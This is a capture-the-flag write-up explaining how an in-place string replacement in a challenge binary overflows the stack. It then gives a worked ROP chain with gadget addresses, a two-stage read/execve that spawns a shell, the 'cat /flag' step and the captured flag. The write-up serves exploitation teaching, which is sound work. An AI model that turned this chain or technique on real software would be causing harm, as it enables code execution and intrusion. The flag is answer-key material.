# Declassifier

**Category:** pwn · **Points:** 75 · **Solves:** 126 · **Author:** xy

## Challenge

A "declassification" filter: it reads up to 512 bytes, replaces every
occurrence of `flux` with `[REDACTED]`, and prints the result. The interesting
part is that the replacement is longer than the needle.

```
$ nc <host> <port>
my flux is flux
my [REDACTED] is [REDACTED]
```

Build flags from the handout Makefile:

```
$(CC) -no-pie -fno-pie -fno-stack-protector -static -g -o declass declass.c
```

Static, non-PIE, no canary. The service writes the flag to `/flag` and then
`unset FLAG` before dropping you into `socat -T600 tcp-listen:1024,fork,reuseaddr
exec:./declass`, so the flag can only be read by code execution.

## TL;DR

`redact()` inserts 10 bytes where it deleted 4, but it moves the tail **without
adjusting the buffer length**. Each match therefore pushes the write frontier 6
bytes further right, and after 53 matches the untouched tail of the 512-byte
stack buffer (saved `rbp`, saved `rip`, and beyond) is copied 318 bytes to the
left — out of the buffer's tail and into the buffer's head, i.e. a controlled
write past the end of `buf` into the saved return address. The chain uses only
gadgets inside the executable segment: `read(0, .bss, 32)` then
`execve("/bin/sh", .bss, NULL)`.

## Files

| file | what it is |
| --- | --- |
| `exploit.py` | builds the payload, sends stage 2, gets a shell |
| `declass` / `declass.c` | the handout binary and source |
| `entrypoint.sh` | `echo "${FLAG:-flag{fluxxx\}}" > /flag; unset FLAG; socat ...` |

## Analysis

### The redactor

```c
static const char *const re = "flux";          /* len 4  */
static const char *const replace = "[REDACTED]"; /* len 10 */

static void redact(char buf[], size_t size) {
    const char *s = buf;
    regmatch_t pmatch[1];
    size_t remaining = size;

    for (unsigned int i = 0; ; i++) {
        if (regexec(&regex, s, countof(pmatch), pmatch, 0)) break;

        off  = pmatch[0].rm_so + (s - buf);
        len  = pmatch[0].rm_eo - pmatch[0].rm_so;
        remaining = remaining - pmatch[0].rm_so - len;

        memcpy(&buf[off+strlen(replace)], &buf[off+len], remaining);
        memcpy(&buf[off], replace, strlen(replace));

        s += pmatch[0].rm_so + strlen(replace);
    }
}
```

`remaining` is decremented by the match offset and the match length, but never
by the six extra bytes the replacement adds. So after *k* matches with total
match offset `a_k`:

```
remaining = n - a_k - 4k
```

and the last `memcpy` copies `remaining` bytes from `buf + a_k + 4` to
`buf + a_k + 10`, i.e. it ends at

```
buf + a_k + 10 + remaining - 1 = buf + n + 6k + 5
```

Every match moves the write frontier six bytes to the right. The first
`remaining` bytes of the source overlap the destination and `memcpy` on this
glibc behaves like `memmove`, so the visible effect is exactly a memmove of the
tail by `+6`.

### Why that is an overflow

`main` reads `sizeof(buf)` bytes and keeps `n` separate:

```c
char buf[512] = { 0 };
size_t n = read(STDIN_FILENO, buf, sizeof(buf));
redact(buf, n);
printf("%s", buf);
```

Frame layout of `main` (`sub rsp, 0x210`, `buf = rbp-0x210`):

```
buf+0    .. buf+511   input                     <- 512 bytes
buf+512  .. buf+519   padding / alignment
buf+520  .. buf+527   n
buf+528  .. buf+535   saved rbp
buf+536  .. buf+543   saved rip
```

With `n = 512` and `k` matches, `redact` writes up to `buf + 512 + 6k + 5`, always
past the buffer, and the bytes it writes there come from **beyond** the buffer —
the saved frame. The trick is to control *what* ends up at `buf + 536`.

### Choosing the shift

If the input is `"flux" * k`, the matches sit at `a_k = 10k` (each previous match
eats 10 bytes of input), and after all matches every byte of the tail is shifted
left by exactly `6k`: `final[x] = input[x - 6k]`.

So to place our ROP chain (`chain`) at saved `rip` (offset 536) we need
`chain_off = 536 - 6k`, with two constraints: the head of the input (`4k` bytes
of `flux`) must not collide with the chain (`4k <= chain_off`), and the chain
must end inside the 512 read bytes (`chain_off + len(chain) <= 511`). For a
176-byte chain that gives `34 <= k <= 53`.

`k = 53` is the extreme end and the one used: `4*53 = 212` bytes of head,
`chain_off = 536 - 318 = 218`, six bytes of filler, chain from 218 to 393.
Everything past that is padding, and byte 511 is forced to `\n` so that a
canonical terminal sees a complete line.

```
offset 0     "flux" * 53          212 bytes
offset 212   "AAAAAA"               6 bytes
offset 218   ROP chain             176 bytes
offset 394   "A" * 117             padding
offset 511   "\n"
```

### The chain

Because the binary is static there is no libc; every gadget must be in the
executable `PT_LOAD` (`0x401000`-`0x4992fd`, `r-x`). All five were confirmed
byte-by-byte in the handout binary:

| address | bytes | gadget |
| --- | --- | --- |
| `0x40422e` | `5f 5d c3` | `pop rdi; pop rbp; ret` |
| `0x414d31` | `5e 5d c3` | `pop rsi; pop rbp; ret` |
| `0x465b35` | `5a 0f bc c0 48 01 f8 c5 f8 77 c3` | `pop rdx; bsf eax,eax; add rax,rdi; vzeroupper; ret` |
| `0x43eb83` | `58 c3` | `pop rax; ret` |
| `0x415635` | `0f 05 c3` | `syscall; ret` |

(the obvious sibling `0x415616` also works but contains `0x16` = `^V`, which is
not PTY-safe, so `0x415635` is used)

`0x4dea20` is a zero-filled, writable `.bss` address (the `RW` `PT_LOAD` covers
`0x4d3a60`-`0x4df388` in memory). Since the chain is only 176 bytes and
`/bin/sh` plus `argv` need 24, the plan is a two-stage read:

```
read (0, 0x4dea20, 32)          SYS_read  = 0,  rdi = 0,  rsi = .bss,  rdx = 32
execve(0x4dea20, 0x4dea20+8, 0) SYS_execve = 59
```

which in qwords (each `pop rdi/rsi` gadget consumes a filler for `rbp`):

```python
POP_RDI, 0,          POP_RSI, SCRATCH, POP_RDX, 32, POP_RAX, 0, SYSCALL,
POP_RDI, SCRATCH,    POP_RSI, SCRATCH+8, POP_RDX, 0,  POP_RAX, 59, SYSCALL,
```

22 qwords = 176 bytes. Stage 2 is `b"/bin/sh\0" + q(0x4dea20) + q(0) + b"\n"`.

### Payload construction (and the NUL problem)

The chain contains NUL bytes, which is fine: `read()` is not string-based and
`printf("%s")` stops at the first NUL *after* the overflow has happened. The
only string-level requirements are that neither the filler nor the chain contains
the literal `flux` (a fresh match inside the chain would shift it) and that no
byte is a terminal control character (`^C`, `^D`, `^Q`, `^S`, `^U`, `^V`, `^Z`,
`^\`, CR, DEL) — `exploit.py` asserts both, so the payload survives a PTY even
though the service itself uses a pipe.

## Solution

```
python3 exploit.py <HOST> <PORT>
```

`python3 exploit.py --check` re-implements `redact()` in Python, runs it on the
payload and prints where the chain landed — a quick way to confirm the offsets
without touching the service:

```
[*] matches=53 shift=318 chain_off=218
[*] landing: 0x40422e 0x0 0x0 0x414d31 0x4dea20
[+] chain lands on the saved rip
```

`exploit.py` builds the payload, connects (TLS is used automatically when the
port is 443), and drives three writes with short pauses:

1. the 512-byte payload ends with `\n`, `read()` returns all of it in one call;
2. `read(0, .bss, 32)` — stage 2 arrives 0.2 s later;
3. after `execve` the same socket is a shell, so it sends
   `cat /flag; echo PWNED` and collects the output.

The pause matters: `main` does a single `read(0, buf, 512)`, so a payload and
stage 2 in one `sendall` could both be swallowed by that first read.

Observed:

```
[*] payload: 512 bytes, 53 matches, chain at input offset 218
[*] sending stage 2 (25 bytes)
flag{...}
PWNED
```

The landing offset can also be confirmed without a debugger: send
`"flux"*4 + "A"*...` with only three bytes of a new return address at offset
536. The echo comes back 539 bytes long and ends in `81 3a 40` (`printf` stops
at the NUL of the high byte), i.e. the saved `rip` was `0x403a81` — the
instruction after `callq *-0x88(%rbp)` in `__libc_csu_init`'s caller, exactly
where `main` returns.

## Flag

```
flag{00p5-57r1ng_r3pl4c3m3n7_w17h0u7_4dju571ng_57r1ng_l3ng7h_15_4_b4d_1d34:14dd5335c3eaa0f7644923c41883bf31}
```

## Notes

* The bug class is the classic "in-place replace with a longer string and no
  length fix-up"; the overflow is not a plain `memcpy` overrun but a
  *displacement* of the tail, which makes the attacker's data land at
  `buf + 536 - 6k` instead of `buf + 536`.
* First attempt used `pop rdi; ret` at `0x4c0bf9`. That address is inside the
  third `PT_LOAD` (`0x49a000`-`0x4d2558`, `r--`, `.rodata`/`.eh_frame`), so the
  moment the chain was executed it died on NX. Gadgets must be checked against
  the `r-x` segment, not merely against "it disassembles".
* `remaining` is `size_t`: if a match sits beyond `n` (possible because
  `regexec` is handed `s`, a pointer that advances past the original buffer)
  the subtraction underflows and the following `memcpy` copies a huge length.
  That variant only crashes; the controlled frontier above is the useful one.
* `exploit.py` re-derives nothing from the binary — all addresses are hardcoded
  for the shipped build, which is what the service runs.